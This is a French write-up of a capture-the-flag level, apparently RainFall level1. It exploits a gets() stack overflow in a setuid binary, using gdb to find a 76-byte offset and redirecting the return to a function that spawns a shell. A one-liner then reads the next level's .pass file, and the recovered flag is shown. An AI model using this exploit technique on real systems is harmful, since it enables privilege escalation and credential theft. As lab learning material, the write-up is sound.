Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
/home/user/level1
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Je tente d'exécuter le binaire `level1` :

```bash
$ ./level1
(waiting for input)
$ ./level1
hello world?
$
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=621e2f06-c90f-42e1-b556-a4a225fc4b1b) et en extrait une version probable du code :

```c
void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void)
{
    char buffer[64];
    gets(buffer);
}
```

Le code présente une vulnérabilité : `gets()`. Cette fonction n'a pas de limite de byte lus, et va écrire dans un buffer de taille 64, je peux donc overflow.

Cela me permet d'exploiter une vulnérabilité similaire à celle connue sous le nom de `Ret2Libc` ([plus d'information ici](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)).

Cette vulnérabilité consiste à ré-écrire l'adresse sur laquelle la dernière instruction (`ret`) d'une fonction pointe (aussi appellé l'`EIP`).

En overflowant le buffer qui m'est donné ici, je peux donc écrire sur la stack et ré-écrire l'`EIP` pour le faire pointer sur autre chose, dans mon cas de figure, je vais faire pointer l'adresse de retour de `main()` vers `run()`.

Cela signifie que lorsque j'aurais envoyé mon "payload" a `gets()`, celui-ci, qui sera trop grand, va écrire sur la stack, et modifier l'exécution de `main()`, qui au lieu de return vers son caller (ce qui équivaut à un `exit` dans un cas classique), va return vers `run()`, et donc exécuter cette fonction.

Il me faut trouver deux informations afin d'exécuter cet exploit :

- La taille de la stack
- L'adresse de `run()` dans la mémoire

J'utilise `gdb` pour trouver la taille de la stack :

```h
$ gdb ./level1 -q
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave <------------ break ici avant le clean de la stack
   0x08048496 <+22>:    ret
End of assembler dump.

(gdb) b *main+21
Breakpoint 1 at 0x8048495

(gdb) r
Starting program: /home/user/level1/level1
dab

Breakpoint 1, 0x08048495 in main ()
(gdb) info registers
...
esp            0xbffff6c0       0xbffff6c0 <--- pointe vers le début de la stack
ebp            0xbffff718       0xbffff718 <--- pointe vers la fin de la stack
...
```

Le calcul suivant : `0xbffff718 - 0xbffff6c0 = 0x58 = 88` m'indique que la stack fait donc 88 bytes dans ce programme. Je dois cependant soustraire `0x10` à mon calcul pour l'overflow, car le buffer n'est pas déclaré au début de la stack comme le montre l'instruction suivante :

```h
   0x08048489 <+9>:     lea    0x10(%esp),%eax
```

Mais à `0x10` de la valeur `%esp`, soit un décalage de `0x10 = 16` bytes.
Je soustrais donc 16 bytes à 88 et trouve : `88 - 16 = 72` bytes afin de pointer sur `ebp`.

Il ne me reste qu'à ajouter 4 bytes supplémentaire à ce calcul pour atteindre l'adresse qui contient la valeur de retour de la fonction `main()`, qui sera enfin utilisé par :

```h
   0x08048496 <+22>:    ret
```

Je dois donc remplir le buffer de 76 bytes, puis, écrire l'adresse de `run()` que je trouve de cette façon :

```h
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run> 
```

Je peux donc maintenant construire mon "payload infecté" de cette manière :

```h
"\x90" * 76 + "\x08\x04\x84\x44"
^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^
buffer -> ebp    adresse de run()
```

Et l'utiliser sur le binaire `level1` tel quel :

```bash
$ (python -c 'print("\x90" * 76 + "\x08\x04\x84\x44"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
